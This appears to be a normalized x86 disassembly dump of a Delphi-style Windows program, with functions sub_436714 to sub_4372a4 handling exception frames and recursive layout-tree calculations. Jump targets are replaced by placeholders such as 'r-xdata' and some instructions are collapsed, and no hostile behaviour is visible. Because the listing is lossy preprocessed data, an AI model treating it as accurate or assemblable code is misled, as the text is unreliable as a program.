pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_436714
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x44 ] 0x100
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_431ce4
mov eax [ ebp - 0x4 ]
and [ eax + 0x44 ] 0xfeff
pop ecx
pop ecx
pop ebp
retn
sub_436744
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_40f8a4
xor eax eax
push ebp
push sub_4367e5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
mov edx [ ebp - 0x8 ]
call sub_40fcf0
xor eax eax
push ebp
push sub_4367c2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
call sub_42b040
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4367c9
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1f0 ]
xor edx edx
call sub_40fcf0
retn
sub_4367fc
push ebp
mov ebp esp
add esp 0xfffffff4
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] eax
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_44c370
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_436840
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
inc [ ebp - 0x8 ]
cmp [ ebp - 0xc ] 0x0
jne r-xdata
sub_436878
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436968
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436968
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_4368f0
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_447a00
call sub_44c7a8
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_436968
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov al [ ebp - 0x8 ]
dec al
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_436a04
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
cmp [ ebp - 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x14 ]
jne r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
call sub_436840
dec eax
jne r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov al [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
call sub_436878
mov edx [ ebp - 0x10 ]
mov edx [ edx + 0x20 ]
sub edx eax
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x64 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0x68 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
sub_436b04
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x10 ]
dec al
je r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_436840
push eax
mov eax [ ebp - 0xc ]
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x10 ]
call sub_436878
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x10 ]
call sub_436cfc
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0xc ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x18 ]
mov eax [ eax + 0x20 ]
add eax [ ebp - 0xc ]
mov edx [ ebp - 0x10 ]
mov [ edx + 0x20 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_436cfc
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cdq
idiv [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
add [ eax + 0x20 ] edx
sub_436bd4
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
call sub_44cae0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
call sub_44cb34
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_447ad8
call sub_44c7a8
sub_436c2c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x14 ] eax
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x8 ]
mov bx 0xffbd
call sub_44c24c
cmp [ ebp - 0x10 ] 0x0
setne [ ebp - 0x9 ]
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al [ ebp - 0x9 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x38 ] edx
xor eax eax
push ebp
push sub_436ca9
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov eax [ ebp - 0x14 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_42d9ac
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
xor edx edx
mov [ eax + 0x38 ] edx
retn
sub_436cb8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
sub_436cfc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
cmp [ eax + 0x6c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ edx + 0x8c ] al
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436a04
mov [ ebp - 0xc ] eax
push ebp
call sub_436cb8
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x64 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
sub [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
sub [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
sub [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
sub [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_436968
push eax
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_436968
mov ecx [ ebp - 0x8 ]
pop edx
call sub_43b800
lea ecx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1c ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_42c1e4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
mov edx [ edx + 0x64 ]
cmp eax [ edx + 0x20 ]
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x1c ]
cmp eax [ edx + 0x68 ]
jl r-xdata
sub_436e70
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
test dl dl
je r-xdata
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44c040
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] 0x4
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x70 ] 0x40000
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] 0xc
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4b ] 0x1
je r-xdata
add esp 0xfffffff0
call sub_44c370
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x4b ] 0x2
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1c ] al
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367fc
mov edx [ ebp - 0x4 ]
mov [ edx + 0x64 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40f184
mov edx [ ebp - 0x4 ]
mov [ edx + 0x10 ] eax
mov edx 0xffffff
xor eax eax
call sub_417034
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_40f338
mov eax [ ebp - 0x4 ]
call sub_43707c
xor eax eax
push ebp
push sub_436f8b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_430844
dec eax
test eax eax
jl r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_436b04
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_436f92
mov eax [ ebp - 0x4 ]
call sub_43708c
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
push 0x0
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_4307d8
mov edx eax
mov cl 0x3
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
inc [ ebp - 0x10 ]
dec [ ebp - 0x14 ]
jne r-xdata
sub_436f92
mov eax [ ebp - 0xc ]
test [ eax + 0x20 ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x14 ]
mov ecx [ edx + 0x28 ]
mov [ eax + 0x30 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x34 ] ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x2c ] edx
mov [ eax + 0x28 ] sub_439410
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
call sub_44c3c8
pop [ fs : 0x0 ]
add esp 0xc
sub_436fe4
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44c3d0
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x4 ]
call sub_438488
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
call sub_44c070
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_44c060
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx [ edx + 0x30 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x34 ]
mov [ eax + 0x2c ] ecx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c3c0
sub_43704c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x4b ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
add [ eax + 0x4 ] 0xc
mov eax [ ebp - 0x8 ]
add [ eax ] 0xc
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_43708c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
dec [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x6c ] 0x0
jg r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ ebp - 0x4 ]
call sub_438f60
sub_4370b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_4370b8
pop ecx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_4370b8
pop ecx
sub_437120
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] edx
mov [ ebp - 0xc ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0xc ]
cmp [ eax + 0x64 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x64 ]
call sub_4370b8
pop ecx
sub_43715c
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x4 ]
call [ ebx ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc ]
call sub_43715c
pop ecx
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x8 ]
call sub_43715c
pop ecx
sub_4371a8
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push ebp
mov eax [ ebp - 0x8 ]
call sub_43715c
pop ecx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
sub_4371d4
push ebp
mov ebp esp
add esp 0xffffffe0
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_436a04
push eax
lea eax [ ebp - 0x20 ]
push eax
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_436a04
push eax
mov edx 0x1
mov eax [ ebp - 0x10 ]
call sub_436968
push eax
mov edx 0x2
mov eax [ ebp - 0x10 ]
call sub_436968
pop edx
pop ecx
call sub_43b800
mov eax [ ebp - 0xc ]
lea esi [ ebp - 0x20 ]
mov edi eax
mov ecx 0x4
[ edi ] [ esi ]
mov eax [ ebp - 0xc ]
xor ecx ecx
mov edx 0x10
call sub_44bd90
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_437264
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437bc4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_4372a4
push ebp
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
push edi
mov [ ebp - 0x9 ] cl
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x47 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x38 ]
call sub_436cfc
jmp r-xdata
mov al [ ebp - 0x9 ]
test al al
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x84 ]
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x2c ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x74 ]
mov [ ebp - 0x9 ] 0x4
sub al 0x5
jne r-xdata
mov eax [ ebp - 0x20 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x2c ]
mov eax [ ebp - 0x30 ]
call sub_43b800
lea esi [ ebp - 0x40 ]
lea edi [ ebp - 0x30 ]
mov ecx 0x4
[ edi ] [ esi ]
lea ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x8 ]
call sub_42c1e4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4367fc
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
mov edx [ ebp - 0x14 ]
mov [ eax + 0x8 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x64 ]
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
mov [ ebp - 0x10 ] eax
xor eax eax
mov al [ ebp - 0x9 ]
mov al [ eax + rw-data ]
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x64 ]
call sub_436840
dec eax
jne r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_438578
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_437120
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
